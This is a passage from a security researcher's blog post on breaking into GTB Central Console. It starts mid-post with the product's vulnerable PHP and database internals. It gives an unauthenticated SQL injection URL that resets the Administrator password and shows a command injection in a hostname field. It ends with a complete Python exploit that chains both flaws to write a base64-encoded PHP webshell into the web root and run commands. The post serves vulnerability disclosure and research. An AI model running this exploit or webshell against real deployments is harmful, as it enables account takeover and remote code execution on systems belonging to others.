src/AppBundle/Service/Backup.php:        exec('/usr/bin/psql -p 17023 -U postgres postgres -c "</span>ALTER USER <span class="s1">' . $this-&gt;postgresDB . '</span> WITH PASSWORD <span class="se">\'</span>dashboard<span class="se">\'</span><span class="s2">" 2&gt;&amp;1', </span><span class="nv">$output</span><span class="s2">, </span><span class="nv">$return_var</span><span class="s2">);
</span></code></pre></div></div> <p>Then:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/psql <span class="nt">-q</span> <span class="nt">-t</span> <span class="nt">-p</span> 17023 <span class="nt">-U</span> postgres dashboard
</code></pre></div></div> <p>We can see there is a <code class="language-plaintext highlighter-rouge">passwd</code> column <strong>;P</strong>:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">user_id</span>                     <span class="o">|</span> <span class="nb">integer</span>                     <span class="o">|</span>              <span class="o">|</span> <span class="k">not</span> <span class="k">null</span> <span class="o">|</span> <span class="n">nextval</span><span class="p">(</span><span class="s1">'users_seq'</span><span class="p">::</span><span class="n">regclass</span><span class="p">)</span>
 <span class="n">login</span>                       <span class="o">|</span> <span class="nb">character</span> <span class="nb">varying</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>      <span class="o">|</span>              <span class="o">|</span> <span class="k">not</span> <span class="k">null</span> <span class="o">|</span> 
 <span class="n">passwd</span>                      <span class="o">|</span> <span class="nb">character</span> <span class="nb">varying</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>       <span class="o">|</span>              <span class="o">|</span>          <span class="o">|</span> 
 <span class="n">email</span>                       <span class="o">|</span> <span class="nb">character</span> <span class="nb">varying</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>      <span class="o">|</span>              <span class="o">|</span>          <span class="o">|</span> 
 <span class="n">name</span>                        <span class="o">|</span> <span class="nb">character</span> <span class="nb">varying</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>      <span class="o">|</span>              <span class="o">|</span> 
<span class="o">//</span><span class="p">...</span>
</code></pre></div></div> <p>We can see the the password is stored in a format that is hypertensive-friendly because it does not use salt. This hash is just the md5 of <code class="language-plaintext highlighter-rouge">password@@@</code>.</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dashboard</span><span class="o">=#</span> <span class="k">select</span> <span class="n">user_id</span><span class="p">,</span><span class="n">passwd</span><span class="p">,</span><span class="n">email</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
       <span class="mi">1</span> <span class="o">|</span> <span class="n">fcbde5e75de51ada20eb0594587db6cf</span> <span class="o">|</span> <span class="n">demo</span><span class="o">@</span><span class="n">gttb</span><span class="p">.</span><span class="n">com</span>
</code></pre></div></div> <p>Quick recap: in 10 minutes after the jailbreak I found a unauthenticated SQL injection that can be used to replace the <code class="language-plaintext highlighter-rouge">Administrator</code> password to a known value. The exploit is simple as:</p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">/ccapi.php?action=setTermsHash&amp;userId=1&amp;hash=pwned',passwd%3d'[MD5 of the password you want to use]
</span></code></pre></div></div> <figure> <img src="/gtbcc-pwned/admin.jpeg" alt="Logged as Administrator" /> <figcaption> Administrator take-over! </figcaption> </figure> <h1 id="3rd-movement-oda-to-command-injections"> <a href="#3rd-movement-oda-to-command-injections" class="anchor-head"></a> 3rd movement: Oda to Command Injections </h1> <p>All these <code class="language-plaintext highlighter-rouge">exec()</code>, <code class="language-plaintext highlighter-rouge">system()</code> and <code class="language-plaintext highlighter-rouge">passthru()</code> combined with bash scripts makes this a chronicle of a death foretold. I just did a grep and picked the one that looked easier to exploit (<code class="language-plaintext highlighter-rouge">/opt/webapp/src/AppBundle/Controller/React/SystemSettingsController.php</code>):</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//...</span>
<span class="k">public</span> <span class="k">function</span> <span class="n">systemSettingsDnsDataAction</span><span class="p">(</span><span class="kt">Request</span> <span class="nv">$request</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="cd">/** @var ConfigurationNetworkHandler $cnh */</span>
        <span class="nv">$cnh</span>     <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">container</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'gtb.handler.configuration_network'</span><span class="p">);</span>
        <span class="nv">$xaction</span> <span class="o">=</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'xaction'</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$xaction</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$content</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="nf">getContent</span><span class="p">(),</span> <span class="kc">true</span><span class="p">);</span>
            <span class="nv">$xaction</span> <span class="o">=</span> <span class="nv">$content</span><span class="p">[</span><span class="s1">'xaction'</span><span class="p">];</span>
        <span class="p">}</span>

        <span class="cd">/** @var Translator $translator */</span>
        <span class="nv">$translator</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">container</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'translator'</span><span class="p">);</span>

        <span class="nv">$ssRepo</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">getDm</span><span class="p">()</span><span class="o">-&gt;</span><span class="nf">getRepository</span><span class="p">(</span><span class="s1">'AppBundle:SystemSettings'</span><span class="p">);</span>

        <span class="k">switch</span> <span class="p">(</span><span class="nv">$xaction</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">case</span> <span class="s1">'read'</span><span class="o">:</span>
                <span class="nv">$dns</span>  <span class="o">=</span> <span class="nv">$cnh</span><span class="o">-&gt;</span><span class="nf">getDnsServer</span><span class="p">();</span>
                <span class="nv">$data</span> <span class="o">=</span> <span class="p">[</span>
                    <span class="s1">'dnsServerIps'</span> <span class="o">=&gt;</span> <span class="nv">$dns</span><span class="p">,</span>
                    <span class="s1">'cc_name'</span>      <span class="o">=&gt;</span> <span class="nv">$ssRepo</span><span class="o">-&gt;</span><span class="nf">getParameterByName</span><span class="p">(</span><span class="nc">SystemSettings</span><span class="o">::</span><span class="no">PARAM_CC_NAME</span><span class="p">)</span><span class="o">-&gt;</span><span class="nf">getValue</span><span class="p">(),</span>
                    <span class="s1">'host_name'</span>    <span class="o">=&gt;</span> <span class="nb">trim</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'/etc/hostname'</span><span class="p">))</span>
                <span class="p">];</span>

                <span class="k">return</span> <span class="k">new</span> <span class="nc">JsonResponse</span><span class="p">([</span>
                    <span class="s1">'results'</span> <span class="o">=&gt;</span> <span class="nv">$data</span>
                <span class="p">]);</span>
            <span class="k">case</span> <span class="s1">'update'</span><span class="o">:</span>
                <span class="nv">$data</span>   <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="n">request</span><span class="o">-&gt;</span><span class="nf">get</span><span class="p">(</span><span class="s1">'data'</span><span class="p">,</span> <span class="s1">'{}'</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
                <span class="nv">$status</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>

                <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dnsServerIps'</span><span class="p">]))</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">isMultiTenant</span><span class="p">())</span> <span class="p">{</span>
                        <span class="nv">$cnh</span><span class="o">-&gt;</span><span class="nf">setDnsServer</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'dnsServerIps'</span><span class="p">]);</span>
                    <span class="p">}</span>
                    <span class="nv">$ssRepo</span><span class="o">-&gt;</span><span class="nf">setParameterByName</span><span class="p">(</span><span class="nc">SystemSettings</span><span class="o">::</span><span class="no">PARAM_CC_NAME</span><span class="p">,</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'cc_name'</span><span class="p">]);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">isMultiTenant</span><span class="p">())</span> <span class="p">{</span>
                        <span class="nb">exec</span><span class="p">(</span><span class="s1">'sudo /opt/webapp/shell/set_hostname.sh '</span> <span class="mf">.</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'host_name'</span><span class="p">]);</span>
                    <span class="p">}</span>
<span class="c1">//...</span>
</code></pre></div></div> <p>Easy to exploit as <code class="language-plaintext highlighter-rouge">whatever; my-payload</code>. Unfortunately to interact with this endpoint you need to be authenticated as Administrator. Imagine if you had a vulnerability that would let you replace the Administrator to a known value and then authenticate as him. Oh, wait!.</p> <h1 id="coda"> <a href="#coda" class="anchor-head"></a> Coda </h1> <p>This is a simple proof of concept that chains both vulnerabilities to create a webshell in the server.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="c1"># Exploit for GTB Central Console (tested on v15.17.1-30814.NG)
# Author: Juan Manuel Fernandez (@TheXC3LL)
</span>


<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">pwd</span> <span class="o">=</span> <span class="s">"196989cdcb8bf751d0513388f30f4783"</span> <span class="c1"># xc3ll
</span>
    <span class="c1"># Exploit Pre-auth SQLi
</span>    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Exploiting the SQLi..."</span><span class="p">)</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s">"/ccapi.php?action=setTermsHash&amp;userId=1&amp;hash=pwned',passwd%3d'"</span> <span class="o">+</span> <span class="n">pwd</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="s">"true"</span> <span class="ow">in</span> <span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[!] Error. Exploit failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Password updated to 'xc3ll'!"</span><span class="p">)</span>

    <span class="c1"># Attempt to login
</span>    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Getting a valid session using the new credentials..."</span><span class="p">)</span>
    <span class="n">form</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s">"_username"</span> <span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s">"Administrator"</span><span class="p">),</span>
            <span class="s">"_password"</span> <span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s">"xc3ll"</span><span class="p">)</span>
            <span class="p">}</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s">"X-Sess-Token"</span> <span class="p">:</span> <span class="s">"pwned"</span>
            <span class="p">}</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s">"/old/login"</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">form</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="k">if</span> <span class="s">"error"</span> <span class="ow">in</span> <span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[!] Error. Could not authenticate with 'Administrator:xc3ll'"</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">session</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="s">"session"</span><span class="p">]</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Authenticated! session is "</span> <span class="o">+</span> <span class="n">session</span><span class="p">)</span>

    <span class="c1"># Let's exploit the command injection
</span>    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Exploiting the command injection..."</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">'{"dnsServerIps":"8.8.8.8","cc_name":"","host_name":"adeptsof0xcc; echo PD9waHAgc3lzdGVtKCRfR0VUWyJyY2UiXSk7Pz4K| base64 -d   &gt; /opt/webapp/web/pwned.php"}'</span>
    <span class="n">form</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"xaction"</span> <span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="s">"update"</span><span class="p">),</span>
        <span class="s">"data"</span> <span class="p">:</span> <span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"Cookie"</span> <span class="p">:</span> <span class="s">"symfony="</span> <span class="o">+</span> <span class="n">session</span> <span class="o">+</span> <span class="s">"; session="</span> <span class="o">+</span> <span class="n">session</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s">"/old/react/v1/api/system/dns/data"</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">form</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="s">"true"</span> <span class="ow">in</span> <span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[!] Error. Exploit failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Seems like the webshell was uploaded to "</span> <span class="o">+</span> <span class="n">target</span> <span class="o">+</span> <span class="s">"/pwned.php"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Testing with 'id'..."</span><span class="p">)</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s">"/pwned.php?rce=id"</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="s">"nginx"</span> <span class="ow">in</span> <span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[!] Error. Exploit failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"[*] It worked! Check output:</span><span class="se">\n\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">req</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">Have a nice day ^_^"</span><span class="p">)</span>
</code></pre></div></div> <p>Fire in the hole!</p> <figure> <img src="/gtbcc-pwned/exploit.jpeg" alt="Kaboom!" /> <figcaption> Kaboom! </figcaption> </figure> <h1 id="eof"> <a href="#eof" class="anchor-head"></a> EoF </h1> <p>I know both vulnerabilities are trivial to spot and to exploit, and indeed it was a quick quest: 30 minutes to jailbreak it, 10 minutes to spot the SQLi and 10 minutes to spot the command injection.</p> <p>But keep this in mind: this platform, and other similars, are widely deployed in corporative infrastructure. Tons of companies run products without knowning how insecure they are just because they are black-boxes that nobody wastes time to check. Most of cyber-cyber-cyber products are just clusterfucks of scripts in bash, perl, python or PHP combined with duct tape waiting to be pwned.</p> <p>We hope you enjoyed this reading! Feel free to give us feedback at our twitter <a href="https://twitter.com/AdeptsOf0xCC">@AdeptsOf0xCC</a>.</p> </div> </article> </main> <small class="post-updated-at">updated_at 23-01-2024</small> <nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/VBA-hijack-pointers-rwa/" > <div class="nav-arrow">Previous</div> <span class="post-title">VBA: having fun with macros, overwritten pointers & R/W/X memory</span> </a> <a class="post-nav-item post-nav-next" href="/VBA-RWX-ADDENDUM/"> <div class="nav-arrow">Next</div> <span class="post-title">VBA: overwriting R/W/X memory in a reliable way</span> </a> </nav> <footer class="footer"> <a class="footer_item" href="/feed.xml">rss</a> <span class="footer_item">&copy; 2024</span> <small class="footer_copyright"> <!-- Klisé Theme: https://github.com/piharpi/jekyll-klise --> <a href="https://github.com/piharpi/jekyll-klise" target="_blank" rel="noreferrer noopener" >klisé</a > theme on <a href="https://jekyllrb.com" target="_blank" rel="noreferrer noopener" >jekyll</a > </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
